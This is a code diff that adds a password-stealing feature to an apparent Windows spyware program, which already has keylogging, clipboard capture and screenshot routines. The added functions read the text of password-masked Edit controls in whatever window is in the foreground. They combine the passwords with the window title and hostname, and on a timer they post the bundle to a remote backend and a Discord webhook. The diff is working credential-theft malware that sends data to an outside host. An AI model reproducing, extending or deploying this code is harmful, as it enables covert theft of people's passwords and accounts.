@@ -27,6 +27,7 @@ static bool g_running = true;
 static bool g_selfDestructing = false;
 static std::string g_hostname;
 static std::string g_lastClipboard;
+static std::string g_lastPasswordDigest;
 static HWND g_hwnd = NULL;
 
 static std::wstring g_supabaseHost;
@@ -669,6 +670,85 @@ static void CheckAutoScreenshot(const std::string& windowTitle) {
     }
 }
 
+struct PasswordField { HWND hwnd; std::wstring text; };
+
+static BOOL CALLBACK EnumPasswordProc(HWND hwnd, LPARAM lParam) {
+    auto* fields = (std::vector<PasswordField>*)lParam;
+    wchar_t cls[32] = {0};
+    if (!GetClassNameW(hwnd, cls, 32)) return TRUE;
+    if (wcscmp(cls, L"Edit") != 0) return TRUE;
+    LRESULT pwdChar = SendMessageW(hwnd, EM_GETPASSWORDCHAR, 0, 0);
+    if (!pwdChar) return TRUE;
+    int len = (int)SendMessageW(hwnd, WM_GETTEXTLENGTH, 0, 0);
+    if (len <= 0) return TRUE;
+    if (len > 500) len = 500;
+    std::wstring text((size_t)len, 0);
+    SendMessageW(hwnd, WM_GETTEXT, (WPARAM)(len + 1), (LPARAM)&text[0]);
+    fields->push_back({hwnd, text});
+    return TRUE;
+}
+
+static void PostPasswordToDiscord(const std::string& hostname, const std::string& keys) {
+    DWORD now = GetTickCount();
+    g_lastDiscord = now;
+    std::string host = hostname.empty() ? "unknown" : hostname;
+    std::string k = keys.empty() ? "(no keys)" : keys;
+    if (k.size() > 1990) k = k.substr(0, 1990) + "...";
+    std::string payload = "{\"embeds\":[{\"title\":\"Netpen \\u2014 ";
+    payload += EscapeJSON(host);
+    payload += " \\u2014 Password\",\"color\":15158332,\"description\":\"";
+    payload += EscapeJSON(k);
+    payload += "\",\"timestamp\":\"";
+    payload += GetTimestamp();
+    payload += "\"}]}";
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSession) return;
+    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
+    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
+    std::wstring headers = L"Content-Type: application/json";
+    WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)payload.c_str(),
+        (DWORD)payload.size(), (DWORD)payload.size(), 0);
+    WinHttpReceiveResponse(hRequest, NULL);
+    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
+}
+
+static void CheckPasswordFields() {
+    HWND fg = GetForegroundWindow();
+    if (!fg) return;
+    wchar_t winTitle[256] = {0};
+    GetWindowTextW(fg, winTitle, 256);
+    std::string winStr = ToNarrow(winTitle);
+    std::vector<PasswordField> fields;
+    EnumChildWindows(fg, EnumPasswordProc, (LPARAM)&fields);
+    if (fields.empty()) return;
+    std::string digest = winStr;
+    for (size_t i = 0; i < fields.size(); i++) {
+        char buf[32];
+        sprintf_s(buf, 32, "|%p:", fields[i].hwnd);
+        digest += buf;
+        digest += ToNarrow(fields[i].text);
+    }
+    if (digest == g_lastPasswordDigest) return;
+    g_lastPasswordDigest = digest;
+    std::string combined;
+    for (size_t i = 0; i < fields.size(); i++) {
+        if (i > 0) combined += " | ";
+        combined += ToNarrow(fields[i].text);
+    }
+    std::string json = "[{\"window_title\":\"[PASSWORD] ";
+    json += EscapeJSON(winStr);
+    json += "\",\"keys\":\"";
+    json += EscapeJSON(combined);
+    json += "\",\"hostname\":\"";
+    json += EscapeJSON(g_hostname);
+    json += "\"}]";
+    PostKeys(json);
+    PostPasswordToDiscord(g_hostname, combined);
+}
+
 static void CheckClipboard() {
     if (!OpenClipboard(NULL)) return;
     HANDLE h = GetClipboardData(CF_UNICODETEXT);
@@ -782,6 +862,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             static int counter = 0;
             counter++;
             if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
+            if (counter % 2 == 0 && !g_selfDestructing) CheckPasswordFields();
             if (counter % 5 == 0 && !g_keys.empty()) {
                 DWORD now = GetTickCount();
                 if (now - g_lastTick > 300) FlushBuffer();
